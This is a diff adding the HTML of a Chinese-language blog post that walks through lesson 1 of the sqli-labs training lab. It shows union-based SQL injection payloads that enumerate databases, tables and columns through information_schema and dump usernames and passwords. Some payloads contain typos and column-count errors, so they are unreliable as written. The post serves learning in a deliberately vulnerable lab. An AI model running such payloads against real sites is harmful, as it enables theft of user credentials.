@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>sqli-lab-1的wp | past</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="sql-lab-1  使用sqli-lab靶场  这是我完成第一题的wp:  首先打开靶场,发现页面有提示，要去我们输入ID  初步猜想是get型的，尝试在地址栏补充&quot;?id&#x3D;1&quot;  发现页面出现登入账号和密码，修改id后面的数字，可以拿到不同的账号密码 但是我希望能进一步了解这个靶场，先测试sql注入入口 构造&quot;?id&#x3D;1&#39;&quot;  页面报sql语法错误，确定">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-lab-1的wp">
+<meta property="og:url" content="https://xiafujian.github.io/2026/09/25/sqli-lab-1/index.html">
+<meta property="og:site_name" content="past">
+<meta property="og:description" content="sql-lab-1  使用sqli-lab靶场  这是我完成第一题的wp:  首先打开靶场,发现页面有提示，要去我们输入ID  初步猜想是get型的，尝试在地址栏补充&quot;?id&#x3D;1&quot;  发现页面出现登入账号和密码，修改id后面的数字，可以拿到不同的账号密码 但是我希望能进一步了解这个靶场，先测试sql注入入口 构造&quot;?id&#x3D;1&#39;&quot;  页面报sql语法错误，确定">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xiafujian.github.io/image/sqli-lab-1/ffa84c2156f6cd93d3754b5f7779ff55.png">
+<meta property="og:image" content="https://xiafujian.github.io/image/sqli-lab-1/f678d848af77302fee1326d0cdb6cb92.png">
+<meta property="og:image" content="https://xiafujian.github.io/image/sqli-lab-1/d8d7b36212440c7e7ed4fe4244d7b2e8.png">
+<meta property="og:image" content="https://xiafujian.github.io/image/sqli-lab-1/c938bf44f0a3ed1dc4f74fd9d19ff294.png">
+<meta property="og:image" content="https://xiafujian.github.io/image/sqli-lab-1/01b6bd2eb91ab394986fb0172c5aa36f.png">
+<meta property="og:image" content="https://xiafujian.github.io/image/sqli-lab-1/83f395d216c5050c9c45cde82a600013.png">
+<meta property="og:image" content="https://xiafujian.github.io/image/sqli-lab-1/0e4983c85dcc2278f4adf9399f41020f.png">
+<meta property="og:image" content="https://xiafujian.github.io/image/sqli-lab-1/73ad60ddf328e9e1dfe89c0ec8a64c31.png">
+<meta property="og:image" content="https://xiafujian.github.io/image/sqli-lab-1/7a5b12879b0c7d34ded4d90813a46395.png">
+<meta property="og:image" content="https://xiafujian.github.io/image/sqli-lab-1/867b8490d18bdda4a12d2750d0253a4b.png">
+<meta property="og:image" content="https://xiafujian.github.io/image/sqli-lab-1/b79bdb0bd19e7ccea3756d69110a2e5a.png">
+<meta property="og:image" content="https://xiafujian.github.io/image/sqli-lab-1/b66d6990bec8dbc2aa95d8f8887c7db6.png">
+<meta property="og:image" content="https://xiafujian.github.io/image/sqli-lab-1/9c077044d76bb81ee48fc6e232f0ce4b.png">
+<meta property="article:published_time" content="2026-09-25T12:28:46.201Z">
+<meta property="article:modified_time" content="2026-09-25T13:23:23.635Z">
+<meta property="article:author" content="past">
+<meta property="article:tag" content="SQL">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://xiafujian.github.io/image/sqli-lab-1/ffa84c2156f6cd93d3754b5f7779ff55.png">
+  
+    <link rel="alternate" href="/atom.xml" title="past" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">past</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">my blog</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS 订阅"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="搜索"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://xiafujian.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-sqli-lab-1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/09/25/sqli-lab-1/" class="article-date">
+  <time class="dt-published" datetime="2026-09-25T12:28:46.201Z" itemprop="datePublished">2026-09-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      sqli-lab-1的wp
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1>sql-lab-1</h1>
+<ul>
+<li>使用sqli-lab靶场</li>
+</ul>
+<p><strong>这是我完成第一题的wp:</strong><br>
+<br><br>
+首先打开靶场,发现页面有提示，要去我们输入ID</p>
+<p><img src="/image/sqli-lab-1/ffa84c2156f6cd93d3754b5f7779ff55.png" alt=""></p>
+<p>初步猜想是get型的，尝试在地址栏补充&quot;?id=1&quot;</p>
+<p><img src="/image/sqli-lab-1/f678d848af77302fee1326d0cdb6cb92.png" alt=""></p>
+<p>发现页面出现登入账号和密码，修改id后面的数字，可以拿到不同的账号密码<br>
+但是我希望能进一步了解这个靶场，先测试sql注入入口<br>
+构造&quot;?id=1'&quot;<br>
+<img src="/image/sqli-lab-1/d8d7b36212440c7e7ed4fe4244d7b2e8.png" alt=""><br>
+页面报sql语法错误，确定注入点<br>
+补充一下，除了上面修改id后面的数字以外，还可以构造<br>
+?id=1' and 1=1 --+<br>
+?id=1' and 1=2 --+<br>
+<img src="/image/sqli-lab-1/c938bf44f0a3ed1dc4f74fd9d19ff294.png" alt=""><br>
+比较两个页面的不同来确定注入点<br>
+接下来用order by 判断查询有多少列</p>
+<ul>
+<li><code>order by 1</code>：按第 1 列排序，正常页面，代表存在第 1 列</li>
+<li><code>order by 2</code>：正常，存在第 2 列</li>
+<li><code>order by 3</code>：正常，存在第 3 列</li>
+<li><code>order by 4</code>：页面报错 → <strong>最多只有 3 列</strong></li>
+</ul>
+<p><img src="/image/sqli-lab-1/01b6bd2eb91ab394986fb0172c5aa36f.png" alt=""></p>
+<p>接下来查询数据库名称<br>
+构造:?id=-1' union select 11,database(),33--+<br>
+<img src="/image/sqli-lab-1/83f395d216c5050c9c45cde82a600013.png" alt="alt text"><br>
+这样就可以得到一个数据库名称：security<br>
+如果还想查其他的名称，可以用limit:<br>
+例如:?id=-1' union select 11,database(),33 limit 0,1 --+<br>
+修改'0'即可查询其他的名称<br>
+其实还可以一口气查出全部：<br>
+?id=-1' union select 11,group_concat(schema_name),33 from information_schema.schemata--+<br>
+<img src="/image/sqli-lab-1/0e4983c85dcc2278f4adf9399f41020f.png" alt="alt text"></p>
+<p>顺便提醒一下：如果?id=1而不是?id=-1的话，就会出现查询结果显示在页面的情况<br>
+大概是因为前面的语句先实现了，优先显示，所以导致我们后面构造的sql语句执行了也不显示<br>
+<img src="/image/sqli-lab-1/73ad60ddf328e9e1dfe89c0ec8a64c31.png" alt="alt text"></p>
+<p>得到名称查询 security 库下面所有表名<br>
+构造:?id=-1' union select 11,group_concat(table_name),33 from information_schema.tables where table_schema='security'--+</p>
+<p><img src="/image/sqli-lab-1/7a5b12879b0c7d34ded4d90813a46395.png" alt="alt text"></p>
+<p>可以得到users，我要找的账号密码信息应该就在其中</p>
+<p>接下里查询 users 表里面全部字段（列名）<br>
+构造:?id=-1' union select 11,group_concat(column_name),33 from information_schema.columns where table_schema='security' table_name='users'--+</p>
+<p><img src="/image/sqli-lab-1/867b8490d18bdda4a12d2750d0253a4b.png" alt="alt text"></p>
+<p>得到：id 编号、username 账号、password 密码</p>
+<p>最后就是脱库<br>
+构造:?id=-1' union select group_concat(usename,0x7c,password),3 from security.users --+<br>
+<img src="/image/sqli-lab-1/b79bdb0bd19e7ccea3756d69110a2e5a.png" alt="alt text"><br>
+这样就成功拿到账号密码了</p>
+<p>但是账号密码太多了，可以构造:<br>
+?id=-1' union select concat(usename,password),3 from security.users limit 0,1 --+<br>
+依旧是修改'0'这样就可以慢慢找出全部的账号密码了:<br>
+<img src="/image/sqli-lab-1/b66d6990bec8dbc2aa95d8f8887c7db6.png" alt="alt text"><br>
+<img src="/image/sqli-lab-1/9c077044d76bb81ee48fc6e232f0ce4b.png" alt="alt text"></p>
+<p>从这个靶场中可以学到sql注入数据库的全过程，接下俩就要学怎么绕过了</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://xiafujian.github.io/2026/09/25/sqli-lab-1/" data-id="cuideyf0uGd7PLx9aeFrFUXT4" data-title="sqli-lab-1的wp" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL/" rel="tag">SQL</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2026/09/24/sql1/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title">第一次sql注入的学习(portswigger)</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL/" rel="tag">SQL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/markdown/" rel="tag">markdown</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/SQL/" style="font-size: 20px;">SQL</a> <a href="/tags/Web/" style="font-size: 20px;">Web</a> <a href="/tags/markdown/" style="font-size: 10px;">markdown</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/09/">九月 2026</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2026/09/25/sqli-lab-1/">sqli-lab-1的wp</a>
+          </li>
+        
+          <li>
+            <a href="/2026/09/24/sql1/">第一次sql注入的学习(portswigger)</a>
+          </li>
+        
+          <li>
+            <a href="/2026/09/23/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2026/09/22/test/">记录一下一些基本的md代码</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2026 past<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
